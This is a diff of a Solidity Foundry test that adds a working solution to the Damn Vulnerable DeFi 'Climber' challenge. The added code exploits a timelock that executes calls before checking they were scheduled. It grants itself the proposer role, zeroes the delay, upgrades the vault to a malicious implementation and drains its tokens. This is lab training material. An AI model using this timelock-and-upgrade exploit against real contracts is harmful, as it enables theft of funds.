@@ -2,10 +2,16 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
-import {ClimberVault} from "../../src/climber/ClimberVault.sol";
-import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
+import {Test} from "forge-std/Test.sol";
+import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+
+import {ClimberVault} from "../../src/climber/ClimberVault.sol";
+import {ClimberTimelock, CallerNotTimelock} from "../../src/climber/ClimberTimelock.sol";
+import {ADMIN_ROLE, PROPOSER_ROLE} from "../../src/climber/ClimberConstants.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
 contract ClimberChallenge is Test {
@@ -37,21 +43,17 @@ contract ClimberChallenge is Test {
         startHoax(deployer);
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
-        // Deploy the vault behind a proxy,
-        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
         vault = ClimberVault(
             address(
                 new ERC1967Proxy(
-                    address(new ClimberVault()), // implementation
-                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
+                    address(new ClimberVault()),
+                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper))
                 )
             )
         );
 
-        // Get a reference to the timelock deployed during creation of the vault
         timelock = ClimberTimelock(payable(vault.owner()));
 
-        // Deploy token and transfer initial token balance to the vault
         token = new DamnValuableToken();
         token.transfer(address(vault), VAULT_TOKEN_BALANCE);
 
@@ -68,12 +70,10 @@ contract ClimberChallenge is Test {
         assertNotEq(vault.owner(), address(0));
         assertNotEq(vault.owner(), deployer);
 
-        // Ensure timelock delay is correct and cannot be changed
         assertEq(timelock.delay(), TIMELOCK_DELAY);
         vm.expectRevert(CallerNotTimelock.selector);
         timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));
 
-        // Ensure timelock roles are correctly initialized
         assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
         assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
         assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));
@@ -81,11 +81,15 @@ contract ClimberChallenge is Test {
         assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
+    /// CODE YOUR SOLUTION HERE
     function test_climber() public checkSolvedByPlayer {
-        
+        ClimberVaultExploit impl = new ClimberVaultExploit();
+        ClimberScheduleRelay relay = new ClimberScheduleRelay(); // 创建一个relay合约，用于调用schedule函数
+        bytes32 salt = keccak256("climber");
+
+        (address[] memory targets, bytes[] memory data) =
+            ClimberBatch.pack(timelock, vault, address(relay), address(token), recovery, impl, salt);
+        timelock.execute(targets, new uint256[](5), data, salt);
     }
 
     /**
@@ -94,5 +98,55 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract ClimberVaultExploit is ClimberVault {
+    function drain(address token, address to) external onlyOwner {
+        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
+    }
+}
+
+library ClimberBatch {
+    function pack(
+        ClimberTimelock timelock,
+        ClimberVault vault,
+        address relay,
+        address token,
+        address recovery,
+        ClimberVaultExploit impl,
+        bytes32 salt
+    ) internal pure returns (address[] memory targets, bytes[] memory data) {
+        targets = new address[](5);
+        targets[0] = address(timelock);
+        targets[1] = address(timelock);
+        targets[2] = relay;
+        targets[3] = address(vault);
+        targets[4] = address(vault);
+
+        data = new bytes[](5);
+        data[0] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, relay)); // 为了可以使用schedule函数
+        data[1] = abi.encodeCall(ClimberTimelock.updateDelay, (uint64(0)));        // 更新delay为0，可以立即执行
+        data[2] = abi.encodeCall(
+            ClimberScheduleRelay.schedule,
+            (timelock, vault, token, recovery, impl, salt)
+        );
+        data[3] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(impl), bytes("")));
+        data[4] = abi.encodeCall(ClimberVaultExploit.drain, (token, recovery));
+    }
+}
+
+contract ClimberScheduleRelay {
+    function schedule(
+        ClimberTimelock timelock,
+        ClimberVault vault,
+        address token,
+        address recovery,
+        ClimberVaultExploit impl,
+        bytes32 salt
+    ) external {
+        (address[] memory targets, bytes[] memory data) =
+            ClimberBatch.pack(timelock, vault, address(this), token, recovery, impl, salt);
+        timelock.schedule(targets, new uint256[](5), data, salt);
     }
 }
